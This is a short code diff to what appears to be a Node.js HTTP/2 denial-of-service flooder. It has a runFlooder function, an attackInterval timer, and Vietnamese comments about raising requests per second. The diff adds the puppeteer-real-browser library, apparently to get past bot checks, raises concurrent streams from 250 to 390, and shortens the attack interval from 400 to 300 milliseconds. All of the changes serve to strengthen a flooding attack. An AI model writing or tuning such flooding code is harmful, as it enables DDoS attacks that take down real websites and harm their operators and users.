@@ -11,7 +11,7 @@ var colors = require("colors");
 const util = require('util');
 const v8 = require("v8");
 const url = require("url");
-
+const { connect } = require("puppeteer-real-browser");
 const statusesQ = []
 let statuses = {}
 let isFull = process.argv.includes('--full');
@@ -42,7 +42,7 @@ async function runFlooder() {
         },
         settings: {
             headerTableSize: 262144,
-            maxConcurrentStreams: 250, // Tang đe xu ly nhieu request
+            maxConcurrentStreams: 390, // Tang đe xu ly nhieu request
             initialWindowSize: 10485760,
             maxHeaderListSize: 8192
         }
@@ -112,7 +112,7 @@ async function runFlooder() {
 
                 await Promise.all(requestPromises);
             } catch (e) {}
-        }, 400); // Giam interval đe tang req/s
+        }, 300); // Giam interval đe tang req/s
 
         setTimeout(() => {
             clearInterval(attackInterval);
